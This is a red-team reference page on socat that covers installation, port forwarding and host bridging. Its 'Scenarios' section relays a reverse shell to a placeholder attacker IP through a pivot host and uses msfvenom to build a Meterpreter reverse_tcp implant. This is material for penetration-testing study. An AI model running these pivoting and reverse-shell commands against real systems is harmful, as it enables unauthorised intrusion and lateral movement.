# Socat

Search Tag(s): #post-exploitation #pivot #port-forward #scenarios #cross-platform #socat

## 01 - Setup

### 1.1 - Package Manager

```
$ sudo apt install -y socat
```

You can just download the `.deb` file and extract it.

```
$ apt download socat

$ dpkg -x socat_*.deb work
```

Then you can just execute the program as it was portable.

```
$ work/usr/bin/socat -V
```

### 1.2 - Download Pre-compiled Binaries

#### 1.2.1 - Linux

```
$ wget -qO socat https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin && chmod 755 socat

$ curl -o socat https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin && chmod 755 socat
```

#### 1.2.2 - Windows

Download the pre-compiled binary in command prompt.

```
C:\> certutil -urlcache -split -f https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe socat.exe

C:\> curl -o socat.exe https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe
```

Download the pre-compiled binary in PowerShell.

```
PS C:\> Invoke-WebRequest https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe -OutFile socat.exe
```

### 1.3 - Compile

#### 1.3.1 - Linux

```
$ git clone https://github.com/3ndG4me/socat.git && \
cd socat && ./configure && make && make install
```

#### 1.3.2 - Windows

TODO: Fill this info

## 02 - Usage

### 2.1 - Open Two Listening Ports

```
> socat -v tcp-listen:<local_PORT_1> tcp-listen:<local_PORT_2>
```

### 2.2 - Redirect Port

```
> socat tcp-listen:<local_PORT>,reuseaddr tcp-connect:<target_IP>:<target_PORT>
```

### 2.3 - Bridge Two Hosts

```
> socat -v tcp-connect:<target_IP_1>:<target_PORT_1>,reuseaddr tcp-connect:<target_IP_2>:<target_PORT_2>
```

## 03 - Scenarios

### 3.1 - Port Forward Reverse Shell

```
> socat tcp4-listen:<pivot_PORT>,fork tcp4:<attacker_IP>:<attacker_PORT>
```

Generate a reverse shell with the IP address of the compromised machine to pivot from.

```
userware@hackware-os:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<pivot_IP> lport=<pivot_PORT> -f exe -o implant.exe
```

### 3.2 - Bind Web Server Port

```
> socat tcp-listen:8443,reuseaddr tcp-connect:<webserver_IP>:443
```

Then use `curl` to check connect to the pivot server.

```
userware@hackware-os:~$ curl -k https://<pivot_IP>:8443
```

---
## References

### Github

- [3ndG4me: Socat Source Repository](https://github.com/3ndG4me/socat)

- [runsisi: Socat Source Repository](https://github.com/runsisi/socat)

- [InternalAllTheThings: Network Pivoting Techniques](https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/)

- [Ironhackers: Port Forwarding Cheatsheet](https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/)

- [Certcube: Pivoting Port Forwarding](https://blog.certcube.com/pivoting-port-forwarding/)

- [Artkond Pivoting Guide](https://artkond.com/2017/03/23/pivoting-guide/)

- [SlayerLabs: Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)

- [SevenLayers: Socat Reverse Shell Relay](https://sevenlayers.com/index.php/blog/500-socat-reverse-shell-relay)

- [CyberSec Wikimandine: Socat](https://amandinegh.gitbook.io/cyberadventure/internal/pivoting-tunneling-and-port-forwarding/socat)